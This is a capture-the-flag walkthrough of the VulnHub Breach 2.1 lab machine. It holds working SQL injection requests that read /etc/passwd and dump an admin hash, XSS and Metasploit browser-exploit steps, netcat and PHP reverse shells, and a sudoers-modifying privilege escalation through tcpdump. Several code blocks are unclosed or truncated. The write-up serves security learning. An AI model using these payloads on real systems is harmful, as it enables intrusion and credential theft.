title: VulnHub - Breach 2.1
---

**Description:** Is a boot2root/CTF challenge which attempts to showcase a real-world scenario, with plenty of twists and trolls along the way.

**Author:** mrb3n

**Operating System:** Linux

**Aim:** To get root shell and read the flag.

**Download:** [https://www.vulnhub.com/entry/breach-21,159/](https://www.vulnhub.com/entry/breach-21,159/)

## Information Gathering
The VM is configured with a static IP (192.168.110.151) so you'll need to configure your host only adaptor to this subnet, so I add an IP address to the vmnet1 interface.

```bash
root@kali:~$ ip addr add 192.168.110.150/24 dev vmnet1
root@kali:~$ ping -c 1 192.168.110.151
PING 192.168.110.151 (192.168.110.151) 56(84) bytes of data.
64 bytes from 192.168.110.151: icmp_seq=1 ttl=64 time=1.18 ms

--- 192.168.110.151 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.175/1.175/1.175/0.000 ms
```

### Port Scanning

I performed a full TCP port scan with nmap and found only three available ports.
 
```bash
root@kali:~$ nmap -n -v -p1-65535 -T5 192.168.110.151 -oG nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
111/tcp   open  rpcbind
37497/tcp open  unknown
65535/tcp open  unknown
...
```

### Service Enumeration

With nmap I performed the version and OS detection, script scanning and traceroute of the TCP open ports.

```bash
root@kali:~$ nmap -n -v -p111,47429,65535 -A 192.168.110.151 -oN nmap/service-enum.txt
...

...
```

### SSH Enumeration 

Without having found anything important about the previous scan, I proceeded to enumerate the SSH service.

```bash
root@kali:~$ ssh root@192.168.110.151 -p 65535
The authenticity of host '[192.168.110.151]:65535 ([192.168.110.151]:65535)' can't be established.
ECDSA key fingerprint is SHA256:r3uJxHJmvGvDbfvH0Y90EO5UAQNeokBIsxs6eDNpEdU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.110.151]:65535' (ECDSA) to the list of known hosts.

```

In the banner I could see that the Peter user exists and his password is in the source. What source?


After a long time without having results, I tried login with the user peter and the password **inthesource**, this works, but the connection was closed.

```bash
root@kali:~$ ssh peter@192.168.110.151 -p65535

#############################################################################
peter@192.168.110.151's password: 
Connection to 192.168.110.151 closed.
```

What happens here, so I decided to re-scan all TCP ports, and I could see port 80 open.

```bash
root@kali:~$ nmap -n -v -p1-65535 -T5 -A 192.168.110.151
...
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))

|_http-title: Initech Cyber Consulting, LLC
...
```


### Web Enumeration

So I decided to interact with the web service and I found a welcome message and an image.

![](/assets/images/breach2/screenshot-1.png)

Then I proceeded to run dirbuster to find hidden files and directories.

![](/assets/images/breach2/screenshot-2.png)

![](/assets/images/breach2/screenshot-3.png)

In the results we can see that the blog directory exists, I access it, and redirected me to a blog.

![](/assets/images/breach2/screenshot-4.png)

With searchsploit I looked for known vulnerabilities for BlogPHP it is a simple blog script, includes features such as adding blogs, comments, upload files and more, it is also quite old so I found many vulnerabilities.

```bash
root@kali:~$ searchsploit blogphp
----------------------------------------------------------------------------- -------------------------
 Exploit Title                                                               |  Path

----------------------------------------------------------------------------- -------------------------
```

## Exploitation
### SQL Injection

I focused in SQL Injection vulnerability, I copied the 5442.txt file to my current directory, and read the specifications to exploit it.

```bash
root@kali:~$ searchsploit -m php/webapps/5042.txt
  Exploit: BlogPHP 2 - 'id' Cross-Site Scripting / SQL Injection
      URL: https://www.exploit-db.com/exploits/5042
     Path: /usr/share/exploitdb/exploits/php/webapps/5042.txt
File Type: Perl script text executable

Copied to: /root/breach2.1/5042.txt
```

The SQL statement to exploit that vulnerability doesn't work, so I proceeded to rebuild the SQL statement and finaly it works. 

**Listing databases**

On the blog database I didn't find anything, so I focused on **oscommerce** database this looks interesting.

```bash
root@kali:~$ curl -s 'http://192.168.110.151/blog/index.php?act=page&id=999999999%27%20union%20select%200,1,table_schema,3,4%20from%20information_schema.tables%20--%20-' | tr '<' '\n' | grep -P 'br />\w' | awk -F ">" '{print $NF}'
information_schema 
blog 
mysql 
oscommerce 
performance_schema
```

**Enumerating tables**

There are many tables, but I focused on the **osc_administrators** table.

```bash
root@kali:~$ curl -s 'http://192.168.110.151/blog/index.php?act=page&id=999999999%27%20union%20select%200,1,table_name,3,4%20from%20information_schema.tab
les%20where%20table_schema=%27oscommerce%27--%20-' | tr '<' '\n' | grep -P 'br />\w' | awk -F ">" '{print $NF}'                                                     
osc_address_book                                                                                                                                                    
osc_administrators                                                                                                                                                  
osc_administrators_access                                                                                                                                           
osc_administrators_log                                                                                                                                              
osc_banners                                                                                                                                                         
osc_banners_history                                                                                                                                                 
osc_categories                                                                                                                                                      
osc_categories_description                                                                                                                                          
osc_configuration                                                                                                                                                   
osc_configuration_group                                                                                                                                             
osc_counter
...
```

**Enumerating columns**


```bash
root@kali:~$ curl -s 'http://192.168.110.151/blog/index.php?act=page&id=999999999%27%20union%20select%200,1,column_name,3,4%20from%20information_schema.columns%20where%20table_schema=%27oscommerce%27%20and%20table_name=%27osc_administrators%27--%20-' | tr '<' '\n' | grep -P 'br />\w' | awk -F ">" '{print $NF}'
id 
user_name 
user_password 
```

**Retrieving users**

```bash
root@kali:~$ curl -s 'http://192.168.110.151/blog/index.php?act=page&id=999999999%27%20union%20select%200,1,concat%28user_name,0x3a,user_password%29,3,4%20from%20oscommerce.osc_administrators--%20-' | tr '<' '\n' | grep -P 'br />\w' | awk -F ">" '{print $NF}'
admin:685cef95aa31989f2edae5e055ffd2c9:32
```

In the output we can see that there is only one record, also in the following picture we can see the password for the MD5 hash.

![](/assets/images/breach2/screenshot-5.png)

**Enumerating the system users**

Listing the system users, I filtered for those who are using a bash shell, to try brute force via SSH.

```bash
root@kali:~$ curl -s 'http://192.168.110.151/blog/index.php?act=page&id=999999999%27union%20select%200,1,load_file(%27/etc/passwd%27),3,4%20--%20-' | tail -n +14 | head -n -4 | sed '1 s/<table.*<br \/>\(.*\)/\1/' | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
peter:x:1000:1000:peter,,,:/home/peter:/bin/bash
milton:x:1002:1002::/home/milton:/bin/bash
```

**Enumerating the ssh configuration file**

At the bottom of the file configuration we can see that only peter can access via ssh, also in the ForceCommand directive we see that a script called startme is being executed after having logged in.

```bash
root@kali:~$ curl -s 'http://192.168.110.151/blog/index.php?act=page&id=999999999%27union%20select%200,1,load_file(%27/etc/ssh/sshd_config%27),3,4%20--%20-' | tail -n +14 | head -n -4 | sed '1 s/<table.*<br \/>\(.*\)/\1/'
...
UsePAM yes
AllowUsers peter
ForceCommand /usr/bin/startme
AddressFamily inet
```

To find out that what this script does, I listed the contents of **/usr/bin/startme**.

```bash
root@kali:~$ curl -s 'http://192.168.110.151/blog/index.php?act=page&id=999999999%27union%20select%200,1,load_file(%27/usr/bin/startme%27),3,4%20--%20-' | tail -n +14 | head -n -4 | sed '1 s/<table.*<br \/>\(.*\)/\1/'
#!/bin/bash

sudo /etc/init.d/apache2 start &> /dev/null
```

This script is starting the apache server after peter has logged in.

With SQL Injection vulnerability I cannot find a way to run system commands, so I decided research more and try with the Stored Cross Site Scripting, since I could realize that in the image of the home page was writed beef, so I tried with that.

### Stored Cross Siste Scripting

I copied the 17640.txt file to my current directory.

```bash
root@kali:~$ searchsploit -m php/webapps/17640.txt
  Exploit: BlogPHP 2.0 - Persistent Cross-Site Scripting
      URL: https://www.exploit-db.com/exploits/17640
     Path: /usr/share/exploitdb/exploits/php/webapps/17640.txt
File Type: UTF-8 Unicode text, with CRLF line terminators

Copied to: /root/breach2.1/17640.txt
```

In the instructions it indicates that in the register section the field username is vulnerable, also the victim has to request the members module to trigger the malicious instruction, so I put the following payload, this will try to connect to my machine listening on port 4343.

```bash
<img src="http://192.168.110.150:4343"/>
```

![](/assets/images/breach2/screenshot-6.png)

Then we need to start a netcat listener and wait for the target visit the page (in this case a script) and execute our malicious instruction.

```bash
root@kali:~$ nc -vlnp 4343
listening on [any] 4343 ...
connect to [192.168.110.150] from (UNKNOWN) [192.168.110.151] 33045
GET / HTTP/1.1

```

We have captured the request header, in the User-Agent field we see to perform the request version 15 of firefox was used, googling I found that this is vulnerable to code execution due to improper exception handling on objects that dont have the exposedProps property set, it is possible to overwrite functions that get called from a privileged context and silently invoke the AddonManager to install a malicious plugin.

There is a metasploit exploit for this, so launch metasploit and set up it as shown below:

```bash
root@kali:~$ msfconsole -qx "use exploit/multi/browser/firefox_proto_crmfrequest; \
dquote> set srvhost 192.168.110.150; \

dquote> set lhost 192.168.110.150; \                       
dquote> run"                                                    
[*] No payload configured, defaulting to generic/shell_reverse_tcp  
srvhost => 192.168.110.150                                       
srvport => 8888

[*] Using URL: http://192.168.110.150:8888/Xqndzuz                
[*] Server started. 
```

As we can see this created a URL containing the malicious instruction, I tried to create the payload with other HTML tags but it didn't work except with iframe tag.

```bash
<iframe src="http://192.168.110.150:8888/rC9mcJIc" ></iframe>
```
![](/assets/images/breach2/screenshot-7.png)

Following the same idea we wait a minutes and get a shell with privileges of the user peter.

```bash

We have an unstable shell so I decided to switch to a netcat reverse shell.

```bash

nc 192.168.110.150 443 -e /bin/bash

I upgraded to a full TTY shell, and I could see the script that visits the blog every 4 minutes.

```bash

```

Then I list the services running and found a service enabled on port 2323.

```bash
peter@breach2:~$ ss -antl

```

I connected to that service and found the coordinates of a place, and a log in.

```bash
peter@breach2:~$ telnet 127.0.0.1 2323
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

```

I searched on google maps and found references of a place located in Houston, after a several attempts of login I discovered that the user is milton and the password is Houston, but there is another problem, ask us, whose stapler is it?

![](/assets/images/breach2/screenshot-8.png)

So I proceed to find for milton readable files and filter for the string stapler.

```bash
peter@breach2:~$ find / -readable -user milton -type f 2>/dev/null | xargs grep stapler
/usr/local/bin/cd.py:   question = raw_input("Whose stapler is it?")
peter@breach2:~$ cat /usr/local/bin/cd.py
#!/usr/bin/python

import signal
import time
import os

s = signal.signal(signal.SIGINT, signal.SIG_IGN)

countdown=3

while countdown >0:
        time.sleep(1)
        print(countdown)
        countdown -=1
if countdown <1:
        question = raw_input("Whose stapler is it?")
if question == "mine":
        os.system("echo 'Woot!'")
else:

        os.system("kill -9 %d"%(os.getppid()))
        signal.signal(signal.SIGINT, s)
```

I found a python script with the same question, and whose answer is mine, so I logged in and was switched to user milton.

```bash

listing the processes, I could see that the nginx server is running as root.

```bash
milton@breach2:~$ ps aux | grep nginx

So I decided to list the services again, and found the port 8888 open.

```bash
milton@breach2:~$ ss -antl

```

I interacted with that service, this is a OsCommerce page, it is an e-commerce and online store-management software program.

I found File Inclusion and Stored Cross Site Scripting vulnerabilities for the current version of OsCommerce, I tried to exploit the File Inclusion but didn't work.

![](/assets/images/breach2/screenshot-9.png)

If we remember we have the login credentials to OsCommerce, I tried but didn't work, so I logged in with admin as username and password.

![](/assets/images/breach2/screenshot-10.png)

Searching a way to upload a file, I found the path Tools -> File Manager that allows create and upload files, but we don't have permissions for that, so I decided to go back to the target machine and search for writable directories.

![](/assets/images/breach2/screenshot-11.png)

```bash
milton@breach2:/var/www/html2/oscommerce$ find . -writable -type d 2>/dev/null 
./includes/work
```

I found a directory writable in /var/www/html2/oscommerce/includes/work, I located there and upload a PHP reverse shell.

![](/assets/images/breach2/screenshot-12.png)

```bash
root@kali:~$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
root@kali:~$ sed -i 's/127.0.0.1/192.168.110.150/;s/1234/443/' shell.php
```
![](/assets/images/breach2/screenshot-13.png)

As we see our reverse shell was uploaded as the user blumbrgh.

![](/assets/images/breach2/screenshot-14.png)

Then, we start a netcat listener and run the reverse shell, now we are the user blumbergh.

```bash
http://192.168.110.151:8888/oscommerce/includes/work/shell.php
```

```bash
root@kali:~$ nc -vlnp 443

## Privilege Escalation
### Sudo Permissions

Then I check for sudo permissions, blembergh can execute tcpdump as sudo.


```bash
blumbergh@breach2:/$ sudo -l
sudo -l
Matching Defaults entries for blumbergh on breach2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User blumbergh may run the following commands on breach2:
    (root) NOPASSWD: /usr/sbin/tcpdump

```

Next what I did was send the user blumbergh to the sudoers group to execute the bash command as root without providing password via tcpdump tool, for more information you can check it [here](https://pure.security/how-i-got-root-with-sudo/).

```bash
blumbergh@breach2:/$ echo $'id\necho "blumbergh ALL=(ALL) NOPASSWD: /bin/bash" >> /etc/sudoers' > /dev/shm/r00t 
blumbergh@breach2:/$ chmod +x /dev/shm/r00t
